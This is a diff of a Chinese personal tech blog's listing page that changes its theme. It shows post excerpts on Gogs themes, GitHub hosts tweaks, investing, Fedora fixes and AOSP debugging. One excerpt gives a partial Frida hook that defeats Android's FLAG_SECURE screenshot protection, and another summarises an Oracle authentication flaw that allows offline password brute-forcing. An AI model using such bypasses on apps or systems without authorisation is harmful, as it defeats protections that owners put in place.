-    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/3/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/5/"><i class="fa fa-angle-right"></i></a>
-  </nav>
-
-</div>
-  </main>
-
-  <footer class="footer">
-    <div class="footer-inner">
-
-  <div class="copyright">
-    &copy; 
-    <span itemprop="copyrightYear">2023</span>
-    <span class="with-love">
-      <i class="fa fa-heart"></i>
-    </span>
-    <span class="author" itemprop="copyrightHolder">henices</span>
-  </div>
-
-    </div>
-  </footer>
-
-  
-  <div class="toggle sidebar-toggle" role="button">
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-  </div>
-  <div class="sidebar-dimmer"></div>
-  <div class="back-to-top" role="button" aria-label="Back to top">
-    <i class="fa fa-arrow-up fa-lg"></i>
-    <span>0%</span>
-  </div>
-
-<noscript>
-  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
-</noscript>
-
-
-  
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
-
-  
-
-
-
-
-
-
-  
-
-
-
-
-
-</body>
-</html>
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="安全代码" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">102</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><span> RSS</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('https://wallpaperaccess.com/full/1146672.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="安全代码"><span class="site-name">安全代码</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><span> RSS</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">安全代码</h1><div id="site_social_icons"><a class="social-icon" href="https://twitter.com/henices" target="_blank" title="Twitter"><i class="fab fa-twitter" style="color: #4a7dbe;"></i></a><a class="social-icon" href="mailto:henices@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #24292e;"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/gogs/" title="gogs 皮肤和源码升级">gogs 皮肤和源码升级</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-06T03:00:51.558Z" title="Created 2023-09-06 11:00:51">2023-09-06</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Programming/">Programming</a></span></div><div class="content">gogs 使用了也有一年多了，小团队使用基本还行。有几个问题，第一界面代码 merge 有问题，第二不支持代码 review，如果能解决上面两个问题就好用很多了。下面两段是年前折腾 gogs 的记录，没有啥技术含量，只是做个备份。
+切换皮肤https://github.com/Kos-M/GogsThemes 提供了两款皮肤，文中给出的方法要修改 gogs 配置，直接使用 TamperMonkey 就可以了。
+1234567891011121314151617// ==UserScript==// @name         Gogs Theme// @resource     IMPORTED_CSS https://raw.githubusercontent.com/Kos-M/GogsThemes/master/themes/dark_theme.css// @namespace    http://tampermonkey.net/// @version      0.1// @description  try to take over the world!// @author ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/github_speed_up/" title="github clone 加速">github clone 加速</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-06T03:00:51.526Z" title="Created 2023-09-06 11:00:51">2023-09-06</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Programming/">Programming</a></span></div><div class="content">国内因为众所周知的原因，git clone 一直很慢，最近可能状况就更糟糕了。@TeleMan 提供了一个信息，可以通过修改 host 文件达到加速效果。经过测试，只要修改两条记录即可
+12199.232.69.194                github.global.ssl.fastly.net140.82.113.4                  github.com
+
+修改后，速度快多了，直连
+12345678git clone https://github.com/googleprojectzero/winafl.git正克隆到 &#x27;winafl&#x27;...remote: Enumerating objects: 1538, done.remote: Counting objects: 100% (175/175), done.remote: Compressing objects: 100% (108/108), done.remote: Total 1538 (delta 90), reused 130 (delta 60), pack-reuse ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/fupangjiqiao/" title="高效复盘技巧">高效复盘技巧</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-06T03:00:51.523Z" title="Created 2023-09-06 11:00:51">2023-09-06</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/investment/">investment</a></span></div><div class="content">前些年总结的，现在看起来，过于复杂了，可能做短线的会有需求。
+
+</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/fundamental/" title="基本面需要关注的点">基本面需要关注的点</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-06T03:00:51.522Z" title="Created 2023-09-06 11:00:51">2023-09-06</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/investment/">investment</a></span></div><div class="content">准备多写点东西，内容将不在局限于网络安全。
+不得不说搞金融的这些人很厉害，各种玩法坑死大家了。除了一般需要关注的点，还需要关注几个地方，其实这些点在某些情况下比PE，ROE 啥的都重要：
+
+可转债 （一堆家伙喜欢套利）
+配股   （散户不太喜欢配股）
+融资盘 （主力不喜欢太多人做轿子）
+增发   （这个情况比较复杂，增发价是比较重要的）
+质押   （太高可能暴雷）
+GDR   （还是套利）
+商誉   （可能要计提，影响净利润）
+减持   （主力不喜欢给大股东抬轿子)
+
+要了解这些情况最可靠的方法为读公告，一般情况雪球和东方财富股吧会有人讨论。
+https://xueqiu.com/http://guba.eastmoney.com/
+</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/fengliu/" title="【转】冯柳投资十大金句">【转】冯柳投资十大金句</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-06T03:00:51.505Z" title="Created 2023-09-06 11:00:51">2023-09-06</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/investment/">investment</a></span></div><div class="content">（一）经济的波动就像是剪羊毛，长好了就剪、剪完了再长。拿剪子的一般就是赢家，当然赢家之间也有互相剪的，所以就有大小赢家、长短赢家之分。
+（二）技术分析主要是找出趋势和预期同向运动并强化的机会，价值分析则可以在反向运动但最终会被预期改变的机会上下注。
+（三）各方面都完美的系统是不可能长期存在的，放弃效率和短期安全的系统往往才会是长期安全和可重复的。这不太符合人性，也就保证了系统的独特和有效性，也有利于将精力放在长期要素和战略点的思考上。
+（四）涨跌都能令人坚定的才是好标的，跌令实的更实，因为价钱便宜了。涨令虚处显得确定，因为得到市场的确认和佐证了。这就是虚实结合带来的效果，如果涨几十个点就让人有想卖的感觉，那就说明虚处不足，就不太可能是好选择，最后也许连那几十个点也不容易挣到。反过来也是一样，跌了不敢重仓加的就说明实处不够，要多检讨下自己对确定性的把握能力。
+（五）资产就是金钱在不同时间下的不同属性，本质就是现在的钱和未来的钱之间进行交换，买入是用现在换未来，卖出则是把未来换现在，关键要想明白未来和现在谁更值钱就好了。牛熊市就是这样的一个判断依据，当然，对极少数的优异公司来说，未来总是会 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/Fedora36-Nvidia/" title="升级 Fedora 36，遇上 Nvidia 驱动问题">升级 Fedora 36，遇上 Nvidia 驱动问题</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-06T03:00:51.432Z" title="Created 2023-09-06 11:00:51">2023-09-06</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/linux/">linux</a></span></div><div class="content">Fedora 36 正式版已经释出一段时间了，根据我的经验开始的一周都会有 bug，一般等一段时间再升级会更平滑一些。然而，老革命又遇上了新问题，显示出问题了启动不起来。我已经很久没有遇上显示驱动问题了，我在很久以前就禁用了开源驱动 nouveau，一直都用得很好。
+修改 &#x2F;etc&#x2F;default&#x2F;grub 文件，在 GRUB_CMDLINE_LINUX 添加下面参数
+1GRUB_CMDLINE_LINUX=&quot;... rd.driver.blacklist=nouveau modprobe.blacklist=nouveau nvidia-drm.modeset=1&quot;
+
+重新生成 grub 文件， sudo grub2-mkconfig -o /boot/grub2/grub.cfg，但是在升级 Fedora 36 后似乎没有起作用。诡异的是 Fedora 35 的内核却可以正常工作，首先怀疑的是 nvidia 驱动可能没有安装对。执行下面命令行
+12sudo dnf reinstall xorg-x11-drv-nvidia akmo ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/Fedora31/" title="Fedora31 的几个变化">Fedora31 的几个变化</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-06T03:00:51.430Z" title="Created 2023-09-06 11:00:51">2023-09-06</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/linux/">linux</a></span></div><div class="content">1. 默认启用 Cgroups V2nozuonodie， 升级到 Fedora 31 后， CgroupsV2 已经默认开启，理由是原来不是默认开启没人用，现在让 Fedora 用户先当当小白鼠，于是 Docker 就倒下了。http://t.cn/Ai1sI5LH   grub2 配置文件 &#x2F;etc&#x2F;default&#x2F;grub， 内核参数添加 systemd.unified_cgroup_hierarchy&#x3D;0可以重新开启  CgroupsV1 ​​​​
+2. 默认的 Python 为 Python3https://fedoraproject.org/wiki/Changes/Python_means_Python3
+唉，不得不说 Fedora 这次有点太激进了， 搞得我编译 chromium 又出问题了。 要换回去有个歪招
+ln -s /usr/bin/python2 /usr/local/bin/python
+</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/disable_security_flags/" title="恢复 Android App 的截屏功能">恢复 Android App 的截屏功能</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-06T03:00:51.426Z" title="Created 2023-09-06 11:00:51">2023-09-06</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Security/">Security</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/Android/">Android</a></span></div><div class="content">今天遇上某 App 禁止截屏，其实就是使用了下面这段代码
+1getWindow().setFlags(LayoutParams.FLAG_SECURE, LayoutParams.FLAG_SECURE);
+
+
+使用 frida 脚本可以绕过绕过这个限制 （使用 frida 需要将手机 root）。
+12345678910111213Java.perform(function () &#123;   // https://developer.android.com/reference/android/view/WindowManager.LayoutParams.html#FLAG_SECURE   var FLAG_SECURE = 0x2000;   var Window = Java.use(&quot;android.view.Window&quot;);   var setFlags = Window.setFlags;  //.overload(&quot;int&quot;, &quot;int&quot;)   setFlags.implementation = fun ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/debug_aosp_java_code/" title="调试AOSP Java 代码">调试AOSP Java 代码</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-06T03:00:51.339Z" title="Created 2023-09-06 11:00:51">2023-09-06</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Android/">Android</a></span></div><div class="content">下载 Android 源代码，编译
+12345$ source build/envsetup.sh$ lunch$ make$ mmm development/tools/idegen/$ ./development/tools/idegen/idegen.sh
+
+运行后将生成下面几个文件
+123android.ipr (IntelliJ / Android Studio)android.iml (IntelliJ / Android Studio).classpath  (Eclipse)
+
+
+
+在Android Studio 中导入 android.ipr
+
+File -&gt; Open 选择 android.ipr, 导入后可以Android Studio 中浏览AOSP 源码
+
+设置远程调试配置文件
+
+Run -&gt; Edit Configuration 点击左上角的 + 类型选择 Remote
+
+Attack 到需要调试的进程
+
+这里有两种方法，一是使用SDK 提供的 Monitor 二是使用 Android Studio 自带的Attach debugger to A ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/cve-2012-3137/" title="Oracle Database身份验证协议安全限制绕过漏洞(CVE-2012-3137)">Oracle Database身份验证协议安全限制绕过漏洞(CVE-2012-3137)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-06T03:00:51.338Z" title="Created 2023-09-06 11:00:51">2023-09-06</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Security/">Security</a></span></div><div class="content">12345678910111213NSFOCUS ID:    20847BUGTRAQ ID:    55651CVE ID:        CVE-2012-3137远程漏洞：      是本地漏洞：      是漏洞类型：漏洞影响：      远程攻击者可以密码进行离线密码暴力破解危险指数：      高创建时间：      2012-9-27更新时间：攻击代码：      无跟踪工程师：    zz
+
+漏洞概述:Oracle是一款广泛被使用的商业数据库。
+Oracle O5LOGON认证协议存在漏洞，这个漏洞可以使攻击者离线暴力破解Oracle数据库密码，从而访问受保护的Oracle数据库中的数据。要利用这个漏洞攻击者只需要知道一个合法的数据库用户名和一个正确的数据库名(SID)，不需要使用中间人攻击。
+Martinez Fayo 在2010年5月向Oracle报告了这个问题，Oracle在2011年的中期通过patch set 11.2.0.3修复了这个漏洞，使用了新版本的协议。但是Oracle没有在 11.1和11.2 中修复这个问题，因此这些版本仍然存在漏洞。
+由于漏洞发 ...</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/3/#content-inner"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/#content-inner">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/#content-inner">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/#content-inner">11</a><a class="extend next" rel="next" href="/page/5/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">henices</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">102</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a></div></div><!--    a(href=url_for(config.category_dir) + '/')--><!--      .headline= _p('aside.categories') --><!--      .length-num= site.categories.lengthif theme.aside.card_author.button.enable
+  a#card-info-btn(href=theme.aside.card_author.button.link)
+    i(class=theme.aside.card_author.button.icon)
+    span=theme.aside.card_author.button.text
+
+if(theme.social)
+    .card-info-social-icons.is-center
+      !=partial('includes/header/social', {}, {cache: true})--><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/pdfium-fuzz.public/" title="使用 afl-fuzz fuzz pdfium">使用 afl-fuzz fuzz pdfium</a><time datetime="2023-11-06T05:52:04.969Z" title="Created 2023-11-06 13:52:04">2023-11-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/en/learn_in_public/" title="Learn In Public 摘要">Learn In Public 摘要</a><time datetime="2023-11-01T15:05:19.059Z" title="Created 2023-11-01 23:05:19">2023-11-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/tulading/" title="图拉鼎谈独立开发">图拉鼎谈独立开发</a><time datetime="2023-10-31T16:00:00.000Z" title="Created 2023-11-01 00:00:00">2023-11-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/youyuxi/" title="尤雨溪谈成功和运气">尤雨溪谈成功和运气</a><time datetime="2023-10-31T16:00:00.000Z" title="Created 2023-11-01 00:00:00">2023-11-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/qiangliyandu/" title="万维钢的强力研读笔记法">万维钢的强力研读笔记法</a><time datetime="2023-09-24T16:00:00.000Z" title="Created 2023-09-25 00:00:00">2023-09-25</time></div></div></div></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>Tags</span></div><div class="card-tag-cloud"><a href="/tags/Malware/" style="font-size: 1.32em; color: #99a2ae">Malware</a> <a href="/tags/Software/" style="font-size: 1.25em; color: #999fa7">Software</a> <a href="/tags/PKM/" style="font-size: 1.21em; color: #999da3">PKM</a> <a href="/tags/Archives/" style="font-size: 1.14em; color: #999a9c">Archives</a> <a href="/tags/investment/" style="font-size: 1.39em; color: #99a5b5">investment</a> <a href="/tags/KNOWLEDGE/" style="font-size: 1.1em; color: #999">KNOWLEDGE</a> <a href="/tags/vim/" style="font-size: 1.25em; color: #999fa7">vim</a> <a href="/tags/Security/" style="font-size: 1.5em; color: #99a9bf">Security</a> <a href="/tags/Android/" style="font-size: 1.46em; color: #99a8bc">Android</a> <a href="/tags/Crack/" style="font-size: 1.17em; color: #999ca0">Crack</a> <a href="/tags/windows/" style="font-size: 1.32em; color: #99a2ae">windows</a> <a href="/tags/ai/" style="font-size: 1.1em; color: #999">ai</a> <a href="/tags/linux/" style="font-size: 1.43em; color: #99a6b8">linux</a> <a href="/tags/Life/" style="font-size: 1.28em; color: #99a0aa">Life</a> <a href="/tags/Programming/" style="font-size: 1.35em; color: #99a3b1">Programming</a></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By henices</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
